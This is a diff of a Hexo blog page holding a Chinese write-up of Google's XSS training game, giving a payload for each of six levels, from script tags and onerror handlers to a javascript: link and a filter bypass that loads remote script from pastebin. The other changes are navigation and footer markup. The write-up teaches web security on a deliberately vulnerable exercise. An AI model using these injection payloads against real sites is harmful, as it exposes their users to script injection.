@@ -191,6 +191,26 @@
         </li>
       
         
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -323,13 +343,13 @@
 
       
         <p>题目链接：<a href="https://xss-game.appspot.com" target="_blank" rel="noopener">https://xss-game.appspot.com</a></p>
-<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>level 1 比较简单，get方法传入的query参数会直接在b标签中输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>level 1 比较简单，get方法传入的query参数会直接在b标签中输出。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">https://xss-game.appspot.com/level1/frame?query=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>level 2 是一个留言板，输入的内容会发布在一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">payload</span><br><span class="line">&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;&gt;</span><br></pre></td></tr></table></figure></p>
 <h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>Level 3 中传入的参数带入到了img标签中的src里，那么这里可以闭合src再引入新的事件触发xss。<br>这里需要注意的是src是由双引号闭合的，但是传入双引号却无法闭合，传入单引号会闭合。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload </span><br><span class="line">https://xss-game.appspot.com/level3/frame#3&apos; onerror=&apos;alert(1)&apos;</span><br></pre></td></tr></table></figure>
-<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>这个题目中，传入的内容会被作为一个时间函数的参数，而这个函数是由img标签中onload事件触发的，那么思路便是将调用的函数闭合，再引入我们需要执行的代码。<br>onload中可以执行多条语句，中间以;分隔，注意这里我们传入的分号要进行url编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">https://xss-game.appspot.com/level4/frame?timer=&apos;);alert(&apos;1</span><br></pre></td></tr></table></figure></p>
-<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><p>这个题目中a标签中的href是用户可控的，href默认是解析url，但是我们可以指定为javascript执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload </span><br><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</span><br></pre></td></tr></table></figure></p>
-<h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><p>这个题目可以使应用程序请求成为外部文件，调用远程js代码，虽然其过滤了https,但是没有考虑大写情况。<br>这里使用一个在线远程文件服务器。<a href="https://pastebin.com/0qkuhWbx" target="_blank" rel="noopener">https://pastebin.com/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw/EuYL4VC8</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload </span><br><span class="line">https:<span class="regexp">//</span>xss-game.appspot.com<span class="regexp">/level3/</span>frame<span class="comment">#3' onerror='alert(1)'</span></span><br></pre></td></tr></table></figure>
+<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>这个题目中，传入的内容会被作为一个时间函数的参数，而这个函数是由img标签中onload事件触发的，那么思路便是将调用的函数闭合，再引入我们需要执行的代码。<br>onload中可以执行多条语句，中间以;分隔，注意这里我们传入的分号要进行url编码<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">https:<span class="regexp">//</span>xss-game.appspot.com<span class="regexp">/level4/</span>frame?timer=<span class="string">');alert('</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><p>这个题目中a标签中的href是用户可控的，href默认是解析url，但是我们可以指定为javascript执行。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload </span><br><span class="line">http<span class="variable">s:</span>//xss-game.appspot.<span class="keyword">com</span>/level5/frame/signup?<span class="keyword">next</span>=javascrip<span class="variable">t:alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><p>这个题目可以使应用程序请求成为外部文件，调用远程js代码，虽然其过滤了https,但是没有考虑大写情况。<br>这里使用一个在线远程文件服务器。<a href="https://pastebin.com/0qkuhWbx" target="_blank" rel="noopener">https://pastebin.com/</a><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">http<span class="variable">s:</span>//xss-game.appspot.<span class="keyword">com</span>/level6/frame#htTp<span class="variable">s:</span>//pastebin.<span class="keyword">com</span>/raw/EuYL4VC8</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -347,7 +367,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/xss/" rel="tag"># xss</a>
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
           
         </div>
       
@@ -449,7 +469,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -459,10 +479,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -470,10 +490,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -524,7 +544,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -534,6 +555,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
